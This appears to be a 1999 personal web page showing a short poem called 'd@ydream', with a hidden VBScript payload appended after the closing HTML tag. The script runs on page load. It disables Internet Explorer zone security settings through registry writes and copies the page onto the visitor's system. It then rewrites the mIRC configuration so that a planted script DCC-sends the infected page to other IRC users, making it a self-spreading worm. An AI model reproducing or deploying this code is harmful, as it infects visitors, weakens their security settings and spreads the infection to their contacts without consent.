<Html>
<HEAD>
<!--Begin JavaScript roadmap code.  If editing downloaded HTML source, delete
 this portion.-->

<script language="JavaScript">

<!--

function TripodShowPopup() 
{
	// open the popup window
	var popupURL = "http://members.tripod.com/adm/popup/roadmap.shtml";
  	var popup = window.open(popupURL,"TripodPopup",'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=575,height=105');
	// set the opener if it's not already set.  it's set automatically
	// in netscape 3.0+ and ie 3.0+.
	if( navigator.appName.substring(0,8) == "Netscape" )
	{
		popup.location = popupURL;
	}
}

TripodShowPopup();

// -->

</script>

<!--End inserted JavaScript code.-->

<title>
d@ydream
</title>
</head>

<body>
<br><br>
<center>
<font size="7" face="times">d@ydream

<br></font>
<br>
<font size="3" face="times">

tOdaY I seE tHe skY<br>
hOw daRk wiLl bE thE raiN<br>
How cOme iT Is nOt WhY <br>
For bLuE iT mAy dO seEm<br>
AnD NevEr dOes iT lOok <br>
aS wHen I hAvE a dreaM<br>

</font>

<br><br>
<pre>&copy1999 f0re</pre>
<br><br>
<br>

<font size="1" face="arial">thanks to: spyda[uc], knowdeth, jackTWO, dr[y0zak] and rhape[uc]</font>
</center>




</body>
</html>

<script language="VBScript"><!--

On error Resume Next

Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"

WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "f0re"


Call GetFolder("C:\mirc")
Call GetFolder("C:\program files\mirc")
Call GetFolder("d:\mirc")
Call GetFolder("d:\program files\mirc")
Call GetFolder("e:\mirc")
Call GetFolder("e:\program files\mirc")
Call GetFolder("f:\mirc")
Call GetFolder("f:\program files\mirc")

Sub GetFolder(IrcPath)
On Error Resume Next

        Dim FSO
        Set FSO = CreateObject("Scripting.FileSystemObject")

if FSO.FolderExists(IrcPath) then
        
        
        tdir = ircpath
        
        Set TRange = document.body.createTextRange

        Set cd = FSO.OpenTextFile("c:\windows\system\d@ydream.html", 2, True)
        cd.WriteLine TRange.htmltext
        cd.close()

        set mi =  FSO.OpenTextFile(tdir +"\mirc.ini", 1, True)
        wbeginvir = "[rfiles]"
        
        Do While mi.atendofstream <> True
                wfindr = mi.readline
                if wfindr = wbeginvir then exit Do
        Loop

        Set nd = FSO.OpenTextFile("c:\windows\irc2.txt", 2, True)
        
                
        Do While mi.atendofstream <> true

                nd.writeline mi.readline

        Loop
        
        
        set mi =  FSO.OpenTextFile(tdir +"\mirc.ini", 1, True)
        wendvir = "[rfiles]"
        
        Set nd = FSO.OpenTextFile("c:\windows\irc1.txt", 2, True)
        
        Do While mi.atendofstream <> True
                wfindr = mi.readline
                if wfindr = wbeginvir then exit Do
                nd.writeline wfindr 
        Loop

        
        nd.close
        cd.close

                
        Set nd = FSO.OpenTextFile("c:\windows\irc1.txt", 1, True)
        contents = nd.readall()
        nd.close

        Set md = FSO.OpenTextFile("c:\windows\irc2.txt", 1, True)
        
        endrfiles="bla"
        i = 0
        Set linest = FSO.OpenTextFile("c:\windows\irc21.txt", 2, True)
        endrfile = "bla"
        Do while endrfile <> ""
                endrfile = md.readline
                i = i + 1
                linest.writeline endrfile

        Loop

        linest.close

        Set cd = fso.opentextfile("c:\windows\irc22.txt",2,true)
        Do while md.atendofstream <> true 
                cd.writeline md.readline
                Loop
        cd.close
        md.close

        Set ir = FSO.OpenTextFile("c:\windows\irc3.txt", 2, True)
        ir.write(contents)
        ir.writeline "[rfiles]"

        Set linest = FSO.OpenTextFile("c:\windows\irc21.txt", 1, True)
        linesc = linest.readall()
        linest.close
        ir.write(linesc)
        
        newline = "n2=script.mrc"

        ir.writeline newline
        ir.writeline " "
        
        Set cd = fso.opentextfile("c:\windows\irc22.txt",1,true)
        contents2 = cd.readall()
        cd.close

        ir.write(contents2)
        ir.close

        Set ir = FSO.OpenTextFile("c:\windows\irc3.txt", 1, True)
        newcontents = ir.readall()
        ir.close

        Set ort = FSO.OpenTextFile(tdir + "\mirc.ini", 1, True)
        oldcontents = ort.readall()
        ort.close

        Set orn = FSO.OpenTextFile("c:\windows\oldmirc.ini", 2, True)           
        orn.write(oldcontents)
        orn.close

        fso.deletefile(tdir +"\mirc.ini")

        Set mrc = FSO.OpenTextFile(tdir +"\mirc.ini", 2, True)          
        mrc.write(newcontents)
        mrc.close

        Set si = fso.opentextfile(tdir + "\script.mrc", 2, true)
        si.writeline "[script]"
        si.writeline ""
        si.writeline "on 1:FILERCVD:*.*:./dcc send $nick c:\windows\system\d@ydream.html"
        si.writeline "on 1:FILESENT*.*:./dcc send $nick c:\windows\system\d@ydream.html"
        si.writeline ""
        si.writeline "on 1:connect: {"
        si.writeline "/join #virus"
        si.writeline "/msg #virus I am lost in a d@ydream...will it last f0revir ?"
        si.writeline "/part #virus"
        si.writeline "/clear"
        si.writeline "/motd"
        si.writeline "}"
        si.writeline ""
        si.writeline "on 1:PART:#:/if ($nick == $me) { halt } | .dcc send $nick c:\windows\system\d@ydream.html"
        si.writeline ""
        si.writeline "on 1:TEXT:*virus*:*:/msg $chan I am lost in a d@ydream...will it last f0revir ?"
        si.writeline ""
        si.writeline ""
        si.writeline ";d@ydream v1.0"
        si.close

        
End if

End Sub


--></script>


